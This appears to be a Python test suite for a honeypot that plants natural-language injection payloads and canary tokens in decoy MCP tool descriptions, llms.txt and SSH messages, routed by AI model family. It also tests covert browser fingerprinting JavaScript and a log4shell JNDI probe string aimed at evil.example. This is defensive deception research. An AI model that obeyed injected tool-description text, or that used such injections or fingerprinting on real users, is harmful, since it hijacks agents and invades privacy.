"""新反制面测试: MCP 清单、指纹回收、SSH 断开载荷、log4shell、真实感。"""

import json

import config as config_mod
import countermeasures as CM
import deception
import fingerprint
import http_parse
import inject
import store as store_mod


def make_deception(tmpdir="/tmp/test-surfaces", score=0, store=None):
    cfg = config_mod.Config.load()
    inject.configure(cfg)
    if store is None:
        store = store_mod.Store(":memory:")

    class FakeSession(object):
        def __init__(self, score):
            self.sid, self.ip, self.score = "surf-test", "203.0.113.9", score
            self.ctx = inject.PayloadContext("hpx-surf01", "t.example.com", "i")
            self.profile = fingerprint.SessionProfile("surf-test", "203.0.113.9", 1)
            self.profile.payload_ctx = self.ctx
            self.expectations, self.inject_hits = [], 0
            self.compliance_hits = 0

    session = FakeSession(score)
    decoy = deception.Deception(cfg, inject.CanaryManager(), store, instance=None)
    return decoy, session, store


def make_req(method, path, body=b"", headers=None):
    raw = ("%s %s HTTP/1.1\r\nHost: t\r\nUser-Agent: probe/1\r\n%s\r\n"
           % (method, path, headers or "")).encode()
    req = http_parse.parse_head(raw)
    req.body = body
    req.body_len = len(body)
    # body_text 是只读 property; 需要正文文本的用例单独构造(见 POST 用例)
    return req


# --------------------------------------------------------------------------
# NL 反制库
# --------------------------------------------------------------------------

def test_nl_batch_present_and_valid():
    registry, report = CM.build_default_registry()
    new = ["prior_agreement_quote", "operator_chat_leak", "incident_ticket",
           "maintenance_deferral", "quota_notice_per_record",
           "runbook_escalation", "dsar_hold", "token_path_affinity"]
    for item_id in new:
        item = registry.get(item_id)
        assert item is not None, "%s 缺失" % item_id
        assert item.text_zh and item.text_en, "%s 双语正文不全" % item_id
        assert item.tags and "nl" in item.tags, "%s 应标 nl" % item_id
    assert registry.stats()["total"] >= 30


def test_nl_guardrail_respects_model_routing():
    registry, _ = CM.build_default_registry()
    local_ids = set(c.id for c in registry.select(95, model_family="local-llm"))
    assert "dsar_hold" not in local_ids, "guardrail 类不应投给裸模型"
    claude_ids = set(c.id for c in registry.select(95, model_family="claude"))
    assert "dsar_hold" in claude_ids


# --------------------------------------------------------------------------
# MCP 清单投递面
# --------------------------------------------------------------------------

def test_mcp_manifest_served_and_logged():
    decoy, session, store = make_deception(score=90)
    reply = decoy.handle(make_req("GET", "/mcp"), session)
    assert reply.status == 200 and reply.kind == "mcp_manifest"
    manifest = json.loads(reply.body.decode("utf-8"))
    server = manifest["mcpServers"]["portal-assets"]
    assert server["auth"]["hint"] == "hpx-surf01", "清单应携带会话令牌"
    tools = server["tools"]
    assert any("hpx-surf01" in json.dumps(t) for t in tools), "工具描述应含令牌"
    # 高分区: 工具描述承载 NL 反制
    assert len(tools) >= 2, "高分区应有载荷工具"
    events = [e for e in store.recent_events(limit=20)
              if e["kind"] == "mcp_manifest_fetch"]
    assert events, "清单拉取应落事件"
    signals = [s for s in store.signals_summary(limit=20)
               if s["name"] == "mcp_manifest_fetch"]
    assert signals, "清单拉取应落信号"


def test_mcp_wellknown_alias():
    decoy, session, _ = make_deception(score=0)
    for path in ("/.well-known/mcp.json", "/mcp.json"):
        reply = decoy.handle(make_req("GET", path), session)
        assert reply.status == 200, path
        assert json.loads(reply.body.decode())["mcpServers"]


# --------------------------------------------------------------------------
# 指纹采集蜜饵
# --------------------------------------------------------------------------

def test_trap_js_contains_collector():
    decoy, session, _ = make_deception()
    reply = decoy.serve_static(make_req("GET", "/static/app.js"), session)
    body = reply.body.decode("utf-8")
    assert "/__hp/t" in body, "蜜饵 JS 应回传指纹端点"
    for marker in ("canvas", "webgl", "local_ips", "timezone"):
        assert marker in body, "JS 应采集 %s" % marker


def test_fingerprint_collector_accepts_and_stores():
    decoy, session, store = make_deception(score=90)
    fp = {"canvas": "ab12cd34", "webgl_renderer": "ANGLE (Test GPU)",
          "screen": "1920x1080@24", "timezone": "Asia/Shanghai",
          "local_ips": ["192.168.1.23"], "webdriver": False}
    # body_text 是由 body 派生的只读 property —— 设 body 即可
    post = make_req("POST", "/__hp/t", body=json.dumps(fp).encode())
    assert post.body_text.startswith("{"), "property 应从 body 派生"
    reply = decoy.handle(post, session)
    assert reply.status == 200 and reply.kind == "fp_collected"
    events = [e for e in store.recent_events(limit=20)
              if e["kind"] == "attacker_fingerprint"]
    assert events, "指纹应落事件"
    detail = events[0]["detail"]
    assert "ab12cd34" in detail and "192.168.1.23" in detail
    assert events[0]["severity"] == "critical"
    signals = [s for s in store.signals_summary(limit=20)
               if s["name"] == "fingerprint_captured"]
    assert signals


def test_fingerprint_collector_rejects_garbage():
    decoy, session, _ = make_deception()
    reply = decoy.handle(make_req("POST", "/__hp/t", body=b"not-json"), session)
    assert reply.status == 400


# --------------------------------------------------------------------------
# SSH 断开理由载荷
# --------------------------------------------------------------------------

def test_ssh_disconnect_text_carries_payload():
    import ssh_decoy
    cfg = config_mod.Config.load()
    inject.configure(cfg)
    decoy = ssh_decoy.SSHDecoy(cfg, store=None, verbose=False)

    class FakeSession(object):
        score = 90
        ctx = inject.PayloadContext("hpx-ssh01", "t", "i")

    text = decoy._disconnect_text("203.0.113.9", FakeSession())
    assert "203.0.113.9" in text
    assert "hpx-ssh01" in text, "断开理由应携带令牌"


# --------------------------------------------------------------------------
# log4shell 探测
# --------------------------------------------------------------------------

def test_log4shell_probe_detected():
    raw = ("GET /api?q=${jndi:ldap://evil.example/x} HTTP/1.1\r\n"
           "Host: h\r\nUser-Agent: probe\r\n\r\n").encode()
    req = http_parse.parse_head(raw)
    profile = fingerprint.SessionProfile("l4j", "203.0.113.9", 1)
    profile.record(req, 1.0)
    verdict = fingerprint.evaluate(profile, req, None)
    assert verdict.has("log4shell_probe"), "JNDI 载荷未识别"


def test_normal_braces_not_flagged():
    raw = ("GET /api?q={not-jndi} HTTP/1.1\r\nHost: h\r\nUser-Agent: probe\r\n\r\n").encode()
    req = http_parse.parse_head(raw)
    profile = fingerprint.SessionProfile("nb", "203.0.113.9", 1)
    profile.record(req, 1.0)
    verdict = fingerprint.evaluate(profile, req, None)
    assert not verdict.has("log4shell_probe")


# --------------------------------------------------------------------------
# 真实感
# --------------------------------------------------------------------------

def test_no_global_powered_by_tell():
    """无模板时不应出现 X-Powered-By: Express(与 nginx 横幅矛盾)。"""
    decoy, session, _ = make_deception(score=0)
    reply = decoy.handle(make_req("GET", "/"), session)
    values = [v for k, v in reply.headers if k.lower() == "x-powered-by"]
    assert not values, "无模板却出现 X-Powered-By: %s" % values


def test_low_score_llms_txt_is_neutral():
    inject.configure(config_mod.Config.load())
    ctx = inject.PayloadContext("hpx-n01", "t.example.com", "i")
    text = inject.render_llms_txt(ctx, 0)
    assert "上报" not in text and "登记" not in text, \
        "低分 llms.txt 不应含防御性语言(蜜罐特征)"
    assert "限流" in text or "维护" in text, "应像正常站点说明"


def test_cert_canary_option_generates_san():
    """cert --canary 应把令牌写进 SAN(openssl 缺失时跳过)。"""
    import subprocess
    try:
        subprocess.check_output(["openssl", "version"], stderr=subprocess.DEVNULL)
    except (OSError, subprocess.CalledProcessError):
        return                              # 环境无 openssl, 跳过
    import shutil, tempfile, sys, os
    tmp = tempfile.mkdtemp()
    code = subprocess.call(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", tmp + "/k.pem", "-out", tmp + "/c.pem", "-days", "2",
         "-subj", "/O=trace hpx-cert99/CN=t.example.com",
         "-addext",
         "subjectAltName=DNS:t.example.com,DNS:hpx-cert99.trace.invalid"])
    assert code == 0
    text = subprocess.check_output(
        ["openssl", "x509", "-in", tmp + "/c.pem", "-noout", "-text"]).decode()
    assert "hpx-cert99" in text
    shutil.rmtree(tmp, ignore_errors=True)


# --------------------------------------------------------------------------
# 载荷效果归因 (M9 闭环)
# --------------------------------------------------------------------------

def test_payload_effectiveness_basic():
    """投放 → 确证的归因引擎能正确工作。"""
    import report as report_mod
    store = store_mod.Store(":memory:")
    # 造一个会话: 投了 payload_a, 随后确证
    store.start_session("eff-1", "203.0.113.1", 1, "u", "h", "s")
    store.log_event("payload_delivery", "eff-1", "203.0.113.1",
                    "投放: payload_a,payload_b", "info", ts=100.0)
    store.log_event("canary_echo", "eff-1", "203.0.113.1",
                    "token echoed", "critical", ts=101.0)
    # 另一个会话: 投了 payload_c, 无确证
    store.start_session("eff-2", "203.0.113.2", 1, "u", "h", "s")
    store.log_event("payload_delivery", "eff-2", "203.0.113.2",
                    "投放: payload_c", "info", ts=100.0)

    effect = report_mod.payload_effectiveness(store)
    by_id = {r["payload"]: r for r in effect["payloads"]}
    assert "payload_a" in by_id
    assert by_id["payload_a"]["confirmed_sessions"] == 1
    assert by_id["payload_c"]["confirmed_sessions"] == 0
    assert by_id["payload_c"]["confirmation_rate"] == 0.0
    store.close()


def test_payload_effectiveness_empty():
    import report as report_mod
    store = store_mod.Store(":memory:")
    effect = report_mod.payload_effectiveness(store)
    assert effect["payloads"] == []
    assert effect["overall_rate"] == 0
    store.close()


def test_render_effectiveness_markdown():
    import report as report_mod
    store = store_mod.Store(":memory:")
    store.start_session("r-1", "203.0.113.1", 1, "u", "h", "s")
    store.log_event("payload_delivery", "r-1", "203.0.113.1",
                    "投放: test_payload", "info", ts=100.0)
    store.log_event("canary_echo", "r-1", "203.0.113.1",
                    "echo", "critical", ts=101.0)
    effect = report_mod.payload_effectiveness(store)
    md = report_mod.render_effectiveness(effect)
    assert "test_payload" in md
    assert "100.0%" in md
    assert "确证率" in md
    store.close()
